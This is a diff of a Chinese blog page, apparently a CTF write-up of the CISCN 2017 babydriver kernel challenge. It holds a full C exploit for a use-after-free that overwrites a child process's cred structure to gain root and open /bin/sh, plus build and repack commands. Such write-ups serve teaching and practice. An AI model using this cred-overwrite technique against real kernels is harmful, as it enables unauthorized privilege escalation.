@@ -5,18 +5,18 @@
 <p>smap/smep用于阻止内核空间直接访问/执行用户空间的数据。</p>
 <br>
 
-<pre><code class="C">// copy_to_user: 从内核空间拷贝数据到用户空间
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F; copy_to_user: 从内核空间拷贝数据到用户空间
 unsigned long copy_to_user(void *to, const void __user *from, usigned long count);
-// 1) to 目标地址，这个地址是用户空间的地址；
-// 2) from 源地址，这个地址是内核空间的地址；
-// 3) count 将要拷贝的数据的字节数。
+&#x2F;&#x2F; 1) to 目标地址，这个地址是用户空间的地址；
+&#x2F;&#x2F; 2) from 源地址，这个地址是内核空间的地址；
+&#x2F;&#x2F; 3) count 将要拷贝的数据的字节数。
 
-// copy_from_user: 从用户空间拷贝数据到内核空间
+&#x2F;&#x2F; copy_from_user: 从用户空间拷贝数据到内核空间
 unsigned long copy_from_user(void __user *to, const void *from, usigned long count);
-// 1) to 目标地址，这个地址是内核空间的地址；
-// 2) from 源地址，这个地址是用户空间的地址；
-// 3) count 将要拷贝的数据的字节数。
-</code></pre>
+&#x2F;&#x2F; 1) to 目标地址，这个地址是内核空间的地址；
+&#x2F;&#x2F; 2) from 源地址，这个地址是用户空间的地址；
+&#x2F;&#x2F; 3) count 将要拷贝的数据的字节数。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <br>
 
 <p><img src="/images/Kernel%20Pwn%E7%9A%84%E7%AE%80%E5%8D%95%E5%B0%9D%E8%AF%95/image-20221204122228943.png" alt="image-20221204122228943"></p>
@@ -37,32 +37,32 @@ unsigned long copy_from_user(void __user *to, const void *from, usigned long cou
 
 <br>
 
-<h2 id="Ciscn2017-babydriver"><a href="#Ciscn2017-babydriver" class="headerlink" title="Ciscn2017  babydriver"></a>Ciscn2017  babydriver</h2><pre><code class="shell">附件解压：
-tar -xvf babydriver.tar
-</code></pre>
+<h2 id="Ciscn2017-babydriver"><a href="#Ciscn2017-babydriver" class="headerlink" title="Ciscn2017  babydriver"></a>Ciscn2017  babydriver</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">附件解压：
+tar -xvf babydriver.tar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>得到三个文件：</p>
 <p>boot.sh：指定了相应的参数去运行qume的shell命令；</p>
 <p>bzImage：内核镜像文件；（可通过file命令查看版本号）</p>
 <p>rootfs.cpio：磁盘镜像(文件系统)；</p>
 <br>
 
-<pre><code class="shell">./boot.sh  #启动(去掉--enable-kvm)
-</code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.&#x2F;boot.sh  #启动(去掉--enable-kvm)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <nr>
 
 <p>对文件系统分析：</p>
 <p>（注意: cpio gzip）</p>
-<pre><code class="shell">提取文件：
-cpio -idmv &lt; rootfs.cpio
-</code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">提取文件：
+cpio -idmv &lt; rootfs.cpio<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <br>
 
 <p>init文件：qemu启动系统后，执行的一系列初始化命令。（flag文件的问题）</p>
 <p>insmod命令：插入内核模块</p>
 <p>rmmod命令：卸载内核模块</p>
-<pre><code class="C">module_init(kernel_module_init);  //载入内核模块
-module_exit(kernel_module_exit);  //卸载内核模块
-</code></pre>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">module_init(kernel_module_init);  &#x2F;&#x2F;载入内核模块
+module_exit(kernel_module_exit);  &#x2F;&#x2F;卸载内核模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <br>
 
 <p>babydriver.ko驱动模块分析：</p>
@@ -83,42 +83,42 @@ module_exit(kernel_module_exit);  //卸载内核模块
 
 <p><code>babyrelease</code>函数中存在UAF漏洞，打开两个设备后，close()其中一个，另一个还可以使用babydev_struct。</p>
 <p>ioctl()函数中可以修改buf的大小为cred结构体同大小，然后close()，随后fork个子进程使得cred和babydev_struct为同个空间。使用UAF修改该块空间（cred为root权限）,子进程的权限即变为root。</p>
-<pre><code class="C">#include &lt;stdio.h&gt;
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;unistd.h&gt;
 #include &lt;fcntl.h&gt;
-#include &lt;sys/wait.h&gt;
-#include &lt;sys/stat.h&gt;
+#include &lt;sys&#x2F;wait.h&gt;
+#include &lt;sys&#x2F;stat.h&gt;
 
 int main()
 &#123;
-    // 打开两次设备
-    int fd1 = open(&quot;/dev/babydev&quot;, 2);
-    int fd2 = open(&quot;/dev/babydev&quot;, 2);
+    &#x2F;&#x2F; 打开两次设备
+    int fd1 &#x3D; open(&quot;&#x2F;dev&#x2F;babydev&quot;, 2);
+    int fd2 &#x3D; open(&quot;&#x2F;dev&#x2F;babydev&quot;, 2);
 
-    // 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)
+    &#x2F;&#x2F; 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)
     ioctl(fd1, 0x10001, 0xa8);
 
-    // 释放 fd1
+    &#x2F;&#x2F; 释放 fd1
     close(fd1);
 
-    // 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠
-    int pid = fork();
+    &#x2F;&#x2F; 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠
+    int pid &#x3D; fork();
     if(pid &lt; 0)
     &#123;
         puts(&quot;[*] fork error!&quot;);
         exit(0);
     &#125;
-    else if(pid == 0)
+    else if(pid &#x3D;&#x3D; 0)
     &#123;
-        // 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0
-        char zeros[30] = &#123;0&#125;;
+        &#x2F;&#x2F; 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0
+        char zeros[30] &#x3D; &#123;0&#125;;
         write(fd2, zeros, 28);
 
-        if(getuid() == 0)
+        if(getuid() &#x3D;&#x3D; 0)
         &#123;
             puts(&quot;[+] root now.&quot;);
-            system(&quot;/bin/sh&quot;);
+            system(&quot;&#x2F;bin&#x2F;sh&quot;);
             exit(0);
         &#125;
     &#125;
@@ -129,17 +129,25 @@ int main()
     close(fd2);
 
     return 0;
-&#125;
-</code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <br>
 
-<pre><code class="shell"># 静态编译
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 静态编译
 gcc -static exploit.c -o exploit
 
 # 打包
-find . | cpio -o --format=newc &gt; rootfs.cpio
-</code></pre>
-<p class="textAlignRight"><span>↶ </span><a href="/">返回首页</a><span></span></p></div></div></body><script src="/js/highlight.min.js"></script><script src="/js/main.js"></script><script src="/js/bootstrap/bootstrap.min.js"></script><script>window.dataLayer = window.dataLayer || [];
+find . | cpio -o --format&#x3D;newc &gt; rootfs.cpio<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p class="textAlignRight"><span>↶ </span><a href="/">返回首页</a><span></span></p></div></div></body><script src="/js/highlight.min.js"></script><script src="/js/main.js"></script><script src="/js/bootstrap/bootstrap.min.js"></script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script async="" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script><script>MathJax = {
+      tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+      },
+      svg: {
+          fontCache: 'global'
+      }
+  };
+</script><script>window.dataLayer = window.dataLayer || [];
 function gtag(){dataLayer.push(arguments);}
 gtag('js', new Date());
 gtag('config', '');</script></html>
